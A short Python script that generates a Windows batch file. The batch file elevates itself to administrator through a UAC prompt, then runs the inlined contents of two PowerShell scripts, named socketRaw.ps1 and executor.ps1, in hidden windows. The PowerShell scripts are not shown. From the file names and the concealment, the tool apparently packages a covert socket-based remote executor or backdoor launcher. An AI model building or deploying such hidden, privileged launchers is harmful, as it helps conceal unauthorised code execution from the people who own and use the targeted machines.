socketBat = open("socket.bat", "w")

socketBat.write("@echo off \n");
socketBat.write("if not \"%1\"==\"am_admin\" (powershell start -verb runas '%0' am_admin & exit /b) \n");
socketBat.write("start powershell -windowstyle hidden -Command \"");
#-windowstyle hidden
socketRaw = open("socketRaw.ps1", "r")
executor = open("executor.ps1", "r")

while 1: 
    # read by character 
    char = socketRaw.read(1)           
    if not char: 
        socketBat.write('"\n')
        break
    if char != '\n':      
        socketBat.write(char)

socketBat.write("start powershell -windowstyle hidden -Command \"");
while 1:
    char = executor.read(1)  
    if not char: 
        socketBat.write('"\n')
        break 
    if char != '\n':      
        socketBat.write(char)   

socketBat.write("pause \n");
socketBat.close()
socketRaw.close()
executor.close()